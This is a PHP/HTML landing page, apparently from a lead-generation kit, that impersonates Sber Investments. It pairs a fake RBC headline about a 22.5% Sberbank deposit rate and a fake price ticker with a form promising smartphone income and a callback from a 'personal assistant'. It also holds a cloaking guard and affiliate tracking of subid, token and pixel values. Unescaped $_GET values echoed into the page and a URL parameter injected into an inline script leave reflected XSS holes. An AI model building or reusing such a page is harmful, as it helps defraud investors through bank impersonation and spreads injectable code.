<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Инвестиции</title>
    <link rel="shortcut icon" href="./img/logo.svg" type="image/x-icon" />
    <link rel="stylesheet" href="styles.css" />

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <div class="header__logo--left">
        <img src="./img/logo_rublex.svg" alt="Rublex" />
        <div class="header__text-wrapper">
          <span class="header__text">Rublex</span>
          <span class="header__text">Clicker</span>
        </div>
      </div>
      <span class="header__divider">Х</span>
      <div class="header__logo--right">
        <img src="./img/logo.svg" alt="Sber" />
        <span>сбер инвестиции</span>
      </div>
    </header>
    <main class="main">
      <div class="ticker-wrapper">
        <div class="ticker-content" id="ticker">
          <span class="ticker-item"
            >Cocoa 1 097,80
            <span class="green"
              ><img src="./img/arrow-up.svg" alt="Icon" /> +11,12%</span
            ></span
          >
          <span class="ticker-item"
            >BTC/USD Бирж. 95 154,00
            <span class="red"
              ><img src="./img/arrow-down.svg" alt="Icon" /> -2 448,00</span
            ></span
          >
          <span class="ticker-item"
            >IMOEX 2 032,39
            <span class="red"
              ><img src="./img/arrow-down.svg" alt="Icon" /> -0,53%</span
            ></span
          >
          <span class="ticker-item"
            >RTSI 944,44
            <span class="red"
              ><img src="./img/arrow-down.svg" alt="Icon" /> -0,53%</span
            ></span
          >
          <span class="ticker-item"
            >Brent 76,78
            <span class="red"
              ><img src="./img/arrow-down.svg" alt="Icon" /> -0,07%</span
            ></span
          >
          <span class="ticker-item"
            >Platinum 1 018,00
            <span class="red"
              ><img src="./img/arrow-down.svg" alt="Icon" /> -0,06%</span
            ></span
          >
        </div>
        <div class="ticker-content" id="ticker-clone"></div>
      </div>
      <div class="main__wrapper">
        <p class="main__heading">
          Сбербанк увеличил процентную ставку по вкладу "Лучший %" до 22,5%
          годовых
        </p>
        <div class="main__date">
          <span>01 фев, 02:34</span>
          <span>РБК Банки</span>
        </div>
        <div class="main__form-wrapper">
          <div class="main__img">
            <img src="./img/main.png" alt="Image" />
          </div>
          <div class="main__form">
            <p class="main__form-heading">
              Реальный доход и заработок в вашем смартфоне
            </p>
            <form
              class="form _main-form contact-form freg thin rounded"
              id="main-form"
              method="post"
            >
              <div class="text-block-6">
                <h2 class="form-heading" style="text-align: center">
                  Заполните форму и личный ассистент свяжется с вами!
                </h2>
              </div>
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
              <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
              <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
              <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
              type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
        <div class="main__bottom">
          <p class="bottom__text">
            За две недели до решения по ключевой ставке Сбербанк увеличил
            процентную ставку по своему флагманскому вкладу с 21% до 22,5%
            годовых, в то время как остальные банки из топ-10, напротив, снижают
            доходность по депозитам
          </p>
          <div class="bottom__charts">
            <div class="bottom__chart left">
              <img src="./img/logo_RBK.svg" alt="RBK" />
              <div class="chart__content">
                <div class="chart__naming">
                  <span class="chart__name">Сбербанк</span>
                  <span class="chart__name secondary">SBERP</span>
                </div>
                <div class="chart__info">
                  <img src="./img/arrow-up.svg" alt="Arrow" />
                  <span class="green">+15%</span>
                </div>
              </div>
            </div>
            <div class="bottom__chart">
              <div class="chart__content">
                <div class="chart__naming">
                  <span class="chart__name">ВТБ</span>
                  <span class="chart__name secondary">VTBR</span>
                </div>
                <div class="chart__info">
                  <img src="./img/arrow-down.svg" alt="Arrow" />
                  <span class="red">-1,99%</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
    <script src="./main.js"></script>
    <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
